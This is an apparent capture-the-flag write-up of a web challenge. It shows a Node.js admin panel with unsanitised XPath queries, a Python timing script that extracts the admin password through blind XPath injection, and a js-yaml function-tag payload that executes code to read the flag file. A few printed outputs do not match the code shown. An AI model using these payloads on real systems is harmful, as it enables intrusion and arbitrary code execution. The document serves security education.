---
title: "BackdoorCTF25 - Trust issues"
subtitle: "A simple admin panel… with questionable trust decisions. Break them and extract what the server is hiding."
excerpt: "A simple admin panel… with questionable trust decisions. Break them and extract what the server is hiding"
date: 2025-12-07
categories: [web]
tags: [xpath, blind injection, rce]
ctfs: [backdoorctf25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

```
.
├── Dockerfile
├── data.xml
├── docker-compose.yml
├── flag.txt
├── package-lock.json
├── package.json
├── protected
│   ├── index.html
│   └── store.html
├── public
│   ├── login.html
│   └── register.html
├── server.js
└── tmp
```

```javascript
// [...]

const dbPath = path.join(__dirname, 'data.xml');

function requireAdmin(req, res, next) {
  const sid = req.cookies.sid;
  if (!sid || !sessions[sid]) {
    return res.redirect('/login.html');
  }

  const username = sessions[sid];


  const query = `//user[username/text()='${username}' and role/text()='admin']`;
  const userNode = xpath.select(query, xmlDoc)[0];

  if (!userNode) {
    return res.status(403).send('ACCESS DENIED: Admin only');
  }

  req.user = username;
  next();
}

app.get('/', (req, res) => {
  res.redirect('/login.html');
});

app.post('/register', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send('Missing username or password');
  }

  const checkQuery = `//user[username/text()='${username}']`;
  const exists = xpath.select(checkQuery, xmlDoc)[0];

  if (exists) {
    return res.status(400).send('User already exists');
  }

  const user = xmlDoc.createElement('user');

  const un = xmlDoc.createElement('username');
  const pw = xmlDoc.createElement('password');
  const rl = xmlDoc.createElement('role');
  const id = xmlDoc.createElement('id');

  un.appendChild(xmlDoc.createTextNode(username));
  pw.appendChild(xmlDoc.createTextNode(password));
  rl.appendChild(xmlDoc.createTextNode('employee'));
  id.appendChild(xmlDoc.createTextNode(Date.now().toString()));

  user.appendChild(un);
  user.appendChild(pw);
  user.appendChild(rl);
  user.appendChild(id);

  const usersNode = xpath.select('//users', xmlDoc)[0];
  usersNode.appendChild(user);

  saveXml();

  res.send("Registered! <a href='/login.html'>Login</a>");
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send('Missing username or password');
  }

  const query = `//user[username/text()='${username}']`;
  const userNode = xpath.select(query, xmlDoc)[0];

  if (userNode) {
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  if (!userNode) {
    return res.status(401).send('Invalid username or password');
  }

  const storedPassword = xpath.select1('string(password)', userNode);

  if (storedPassword !== password) {
    return res.status(401).send('Invalid username or password');
  }


  const sid = Math.random().toString(36).slice(2);
  sessions[sid] = xpath.select1('string(username)', userNode);

 res.cookie('sid', sid, {
  httpOnly: true,     
  sameSite: 'Lax',      
});


  res.redirect('/index');
});

app.get('/store', requireAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, 'protected', 'store.html'));
});

app.post('/admin/create', requireAdmin, (req, res) => {
    console.log('HIT /admin/create', req.body);
  const { filename, fileContent } = req.body;

  if (!filename || !fileContent) {
    return res.status(400).send('Missing filename or YAML content');
  }

    
  const datePrefix = new Date().toISOString().split('T')[0];
   
  const safeBase = path.basename(filename);
  const finalName = `${datePrefix}_${safeBase}`;

  if (finalName === 'config.yml') {
    return res.status(400).send('That filename is not allowed');
  }

    const targetPath = path.join(TMP_DIR, finalName);

  try {
    fs.writeFileSync(targetPath, fileContent, 'utf8');

    let parsed;
    try {
     parsed = yaml.load(fileContent);
     const applied = '' + parsed; 
      return res.json({
        success: true,
        filename: finalName,
        result: applied,  
      });
    } catch (e) {
      return res.status(400).json({
        success: false,
        filename: finalName,
        error: 'Invalid YAML',
        details: e.message,
      });
    }

  } catch (err) {
    console.error('Error writing file:', err);
    return res.status(500).json({ success: false, error: 'Failed to save file' });
  }
});

// [...]

```

The application uses an *XML* file as a user database and exposes the following routes :
- */register* : register a new user (using `xpath`).
- */login* : login (using `xpath`).
- */store* : display previously saved `yaml` notes and allow to upload new ones through the `POST /admin/create` route.

The flag being located in the `/flag.txt` file, we suppose we have to look for any gadget allowing us to access a file. This can be done using the `/admin/create` route that reads the uploaded file for it to be displayed back in the client tab. Therefore, the pipeline becomes clear : 

- Gain admin access
- Read the flag from the server's file system

# Investigations

### Gain admin access

Looking at the way the `/login` route works, we can spot a potential `xpath injection` in the `username` field : 

```javascript
  const query = `//user[username/text()='${username}']`;
  const userNode = xpath.select(query, xmlDoc)[0];

  if (userNode) {
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

```

Moreover, the 2s timeout occuring if the vulnerable query finds something gives us a perfect oracle to execute a `blind xpath injection` and guess the correct admin password character by character using the xpath's `substring` function : 

```python
import requests
import string
import time

URL = "http://<challenge-host>/login" 
ALPHABET = string.ascii_letters + string.digits + "{}_-!@#$%"

password_found = ""
index = 1

while True:
    char_found = False
    for char in ALPHABET:
        payload = f"admin' and substring(password,{index},1)='{char}"
        
        start_time = time.time()
        
        try:
            r = requests.post(URL, json={
                "username": payload,
                "password": "gibberish"
            })
        except Exception as e:
            print(f"Erreur: {e}")
            continue

        end_time = time.time()
        duration = end_time - start_time

        if duration > 1.8: 
            password_found += char
            print(f"Found : {char}, password : {password_found}")
            char_found = True
            index += 1
            break
    
    if not char_found:
        print(f"Final password : {password_found}")
        break
```

Then, we get the admin credentials : 

```
~# python script.py                
Found : d | password : d
Found : f | password : df
Found : 0 | password : df0
Found : 8 | password : df08
Found : c | password : df08c
Found : f | password : df08cf
Password : df08cf
```

> admin:df08cf

We can now get a valid admin *sid* : 

```
~# curl -iX POST "http://<challenge-host>/login" -H "Content-Type: application/json" --data '{"username":"admin", "password":"df08cf"}' | grep Set-Cookie
Set-Cookie: sid=i22j60d2wvb; Path=/; HttpOnly; SameSite=Lax
```

### Retrieve the flag

Looking at the `/admin/create` route, we notice this portion of code that reads the user-provided data and loads it using `js-yaml.load()` : 

```javascript
parsed = yaml.load(fileContent);
     const applied = '' + parsed; 
      return res.json({
        success: true,
        filename: finalName,
        result: applied,  
      });
```

Looking at the `package.json` file for versions, we can see the package version of `js-yaml` used is the  `v2.0.4`. This version, being prior to the `v3.13.1` is vulnerable to a critical **RCE** on its `load` function, allowing an attacker to execute arbitrary *javascript* on the server.

> [https://security.snyk.io/vuln/SNYK-JS-JSYAML-174129](https://security.snyk.io/vuln/SNYK-JS-JSYAML-174129)

We create a *yaml* payload that reads the `./flag.txt` file, which will then be returned to the frontend through the *result* attribute : 

```yaml
!!js/function > function() {const fs = global.process.mainModule.require('fs'); return fs.readFileSync('/app/flag.txt', 'utf8');}()
```

Now, we retrieve the flag using the previously retrieved *sid* : 

```
~# curl -X POST "http://<challenge-host>/admin/create" \
     -H "Content-Type: application/json" \
     -b "sid=i22j60d2wvb" \
     --data '{"filename":"dummy", "fileContent":"!!js/function >\nfunction() {const fs = global.process.mainModule.require(\"fs\"); return fs.readFileSync(\"/app/flag.txt\", \"utf8\");}()"}'
{"success":true,"filename":"2025-12-09_exploit_fix","result":"flag{xPath_to_YamLrc3_ecddd907d5d5decb}\n"}
```

> flag{xPath_to_YamLrc3_ecddd907d5d5decb}
